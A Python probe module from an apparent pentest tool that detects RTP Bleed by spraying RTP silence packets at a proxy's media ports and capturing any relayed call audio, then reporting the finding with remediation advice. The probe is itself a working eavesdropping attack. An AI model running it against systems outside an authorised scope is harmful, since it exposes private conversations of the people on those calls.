"""RTP Bleed detection (CVE-2017-11527 / rtpbleed).

Enable Security disclosed in 2017 that many RTP proxies (Asterisk's chan_sip,
RTPProxy, Kamailio's rtpengine in default config, and various SBCs) will
re-learn the media source address when they receive a packet on the expected
RTP port that looks like RTP.  An attacker who can blindly send RTP packets
to the open RTP port can:

  1. **Passive RTP bleed** — receive the victim's media stream: the proxy
     now relays the remote leg's audio to the attacker's source address.
  2. **Active RTP hijack** — inject audio into either leg of the call.

Our probe implements the *passive* detection — we blind-spray UDP packets
that look like valid RTP (PT=0, PCMU silence) to the common RTP port range
and listen on the source socket for return RTP traffic.  A vulnerable proxy
that is currently bridging a call will rewrite its destination to our source
and relay the far-end audio back to us, producing detectable RTP packets.

Caveats documented in the finding text so the pentester knows what they have:
  * Only detects vulnerability if a live call is bridging media through the
    tested host at the moment of the probe — otherwise the proxy has nothing
    to relay.  Negative results are inconclusive.
  * SRTP-DTLS or ICE consent freshness prevents the re-learn; seeing no
    reply on an SRTP-only deployment is expected.
  * Some proxies (rtpengine with record-mode, FreeSWITCH with media locked
    to the signalled address) are not vulnerable.

No third-party dependencies — stdlib only.
"""
from __future__ import annotations

import random
import select
import socket
import struct
import time
from dataclasses import dataclass, field


# Asterisk default is 10000-20000, FreeSWITCH 16384-32768, Cisco CUCM
# 16384-32767, Grandstream 20000-25000.  We cluster sampling at the
# documented starts because proxies allocate sequentially — an active call
# is overwhelmingly likely to be near the low end of the configured range.
DEFAULT_PORTS = [
    *range(10000, 10100, 2),
    *range(16384, 16484, 2),
    *range(20000, 20100, 2),
    *range(30000, 30100, 2),
]


@dataclass
class RtpBleedResult:
    target_ip: str
    probed_ports: int
    packets_sent: int
    bleed_detected: bool = False
    bleeding_ports: list[int] = field(default_factory=list)
    response_samples: list[bytes] = field(default_factory=list)
    elapsed_s: float = 0.0
    error: str | None = None


def _silence_rtp(seq: int, ts: int, ssrc: int) -> bytes:
    """Build a well-formed RTP packet carrying 20 ms of PCMU silence.

    Proxies validate the first 2 bytes (V=2, PT=0).  Packets that aren't
    structurally valid are dropped and won't trigger the bleed re-learn.
    μ-law silence (0xFF) is the widest-supported codec — G.711 PCMU is
    payload type 0 and universally present.
    """
    header = struct.pack("!BBHII", 0x80, 0x00, seq & 0xFFFF,
                         ts & 0xFFFFFFFF, ssrc & 0xFFFFFFFF)
    payload = b"\xff" * 160  # 20 ms of PCMU silence @ 8 kHz
    return header + payload


def _looks_like_rtp(pkt: bytes) -> bool:
    """Rough RTP detector — version=2 in the top two bits, PT in range."""
    if len(pkt) < 12:
        return False
    version = (pkt[0] >> 6) & 0x03
    pt = pkt[1] & 0x7F
    return version == 2 and pt <= 127


def probe_rtp_bleed(
    target_ip: str,
    ports: list[int] | None = None,
    listen_seconds: float = 4.0,
    rate_pps: int = 50,
    pkts_per_port: int = 3,
    traffic_log=None,
) -> RtpBleedResult:
    """Run a passive RTP-bleed probe against ``target_ip``.

    Methodology:
      1. Open a UDP socket bound to an ephemeral source port.
      2. For each target port, send ``pkts_per_port`` RTP-shaped packets at
         ``rate_pps``.
      3. Drain incoming packets during the send loop and for
         ``listen_seconds`` after the last send.
      4. An RTP-shaped inbound packet from the target proves the proxy
         accepted our spoof and re-pointed its media leg at us.

    We do NOT spoof the source IP.  Raw sockets would require root and hide
    the responses.  Authorised pentest scope assumed — we're testing the
    target's behaviour, not evading attribution.
    """
    start = time.monotonic()
    port_list = list(ports or DEFAULT_PORTS)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("", 0))
    sock.setblocking(False)

    result = RtpBleedResult(
        target_ip=target_ip,
        probed_ports=len(port_list),
        packets_sent=0,
    )

    bleeding: set[int] = set()
    samples: list[bytes] = []
    ssrc = random.randint(0, 0xFFFFFFFF)
    seq = random.randint(0, 0xFFFF)
    ts = random.randint(0, 0xFFFFFFFF)

    try:
        send_interval = 1.0 / max(rate_pps, 1)
        next_send = time.monotonic()

        def _drain(budget_s: float) -> None:
            """Receive whatever is pending within `budget_s`."""
            deadline = time.monotonic() + budget_s
            while time.monotonic() < deadline:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    break
                try:
                    r, _, _ = select.select([sock], [], [], remaining)
                except (OSError, ValueError):
                    break
                if not r:
                    break
                try:
                    data, addr = sock.recvfrom(2048)
                except OSError:
                    break
                if addr[0] != target_ip:
                    continue
                if not _looks_like_rtp(data):
                    continue
                bleeding.add(addr[1])
                if len(samples) < 4:
                    samples.append(data[:48])
                if traffic_log:
                    traffic_log.log("IN", f"{addr[0]}:{addr[1]}", data[:64])

        for port in port_list:
            pkt = _silence_rtp(seq, ts, ssrc)
            for _ in range(pkts_per_port):
                try:
                    sock.sendto(pkt, (target_ip, port))
                    result.packets_sent += 1
                except OSError:
                    continue
                seq = (seq + 1) & 0xFFFF
                ts = (ts + 160) & 0xFFFFFFFF
                pkt = _silence_rtp(seq, ts, ssrc)
                if traffic_log:
                    traffic_log.log("OUT", f"{target_ip}:{port}", pkt[:64])

                next_send += send_interval
                sleep_for = next_send - time.monotonic()
                if sleep_for > 0:
                    time.sleep(sleep_for)
                else:
                    next_send = time.monotonic()
                _drain(0.0)  # non-blocking drain per iteration

        _drain(listen_seconds)

    except OSError as exc:
        result.error = f"socket error: {exc}"
    finally:
        sock.close()

    result.bleeding_ports = sorted(bleeding)
    result.bleed_detected = bool(bleeding)
    result.response_samples = samples
    result.elapsed_s = time.monotonic() - start
    return result


def build_finding(result: RtpBleedResult) -> dict | None:
    """Convert an RtpBleedResult into a findings-dict entry for the report.

    Returns None when the probe was clean (no bleed observed).  Pentesters
    get an informational entry via the runner so they know the probe ran.
    """
    if not result.bleed_detected:
        return None
    return {
        "id": "rtp.bleed",
        "title": "RTP media relay accepts unauthenticated source (CVE-2017-11527)",
        "severity": "high",
        "cvss": 7.5,
        "cve": "CVE-2017-11527",
        "detail": (
            f"Target {result.target_ip} responded with RTP traffic on "
            f"{len(result.bleeding_ports)} port(s) after receiving unsolicited "
            f"PCMU packets from our source address.  Bleeding ports: "
            f"{', '.join(str(p) for p in result.bleeding_ports[:10])}"
            f"{' ...' if len(result.bleeding_ports) > 10 else ''}. "
            "The RTP proxy re-learned its media destination from our probe, "
            "allowing an attacker to passively capture the far-end audio of "
            "any call currently bridging through this host or to inject audio "
            "into a live conversation."
        ),
        "remediation": (
            "Lock the RTP proxy to the SDP-signalled source address rather "
            "than the most-recent-sender.  For Asterisk chan_sip: set "
            "'strictrtp=yes' + 'nat=no' where possible.  For rtpengine: run "
            "with 'record-only' or confirm 'strict-source=true'.  Prefer "
            "chan_pjsip over chan_sip — it defaults to strict-source.  For "
            "long-term remediation, deploy SRTP-DTLS or ICE consent checks."
        ),
    }
